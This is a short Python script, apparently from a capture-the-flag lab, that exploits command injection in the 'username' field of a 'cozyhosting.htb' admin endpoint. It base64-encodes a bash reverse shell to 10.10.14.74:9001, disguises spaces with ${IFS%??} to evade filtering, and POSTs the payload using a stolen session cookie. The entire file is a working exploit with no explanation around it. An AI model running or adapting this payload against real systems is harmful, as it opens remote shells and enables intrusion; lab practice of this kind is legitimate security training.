import requests
import base64
import urllib.parse

rev_shell = b'bash  -i >& /dev/tcp/10.10.14.74/9001 0>&1   '
rev_shell = base64.b64encode(rev_shell).decode()
payload = f';echo "{rev_shell}" | base64 -d | bash;'
payload = payload.replace(" ", "${IFS%??}")   # escape whitespace
payload = urllib.parse.quote(payload, safe='${}"|')

print(f'[*] Payload = {payload}')

data = {
    "host": "127.0.0.1",
    "username": payload
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'http://cozyhosting.htb/admin',
    "Cookie": "JSESSIONID=0D6CECD75423BC093D8306A67B0356D6"
}

endpoint = 'http://cozyhosting.htb/executessh'
response = requests.post(endpoint, headers=headers, data=data)

print(response.text)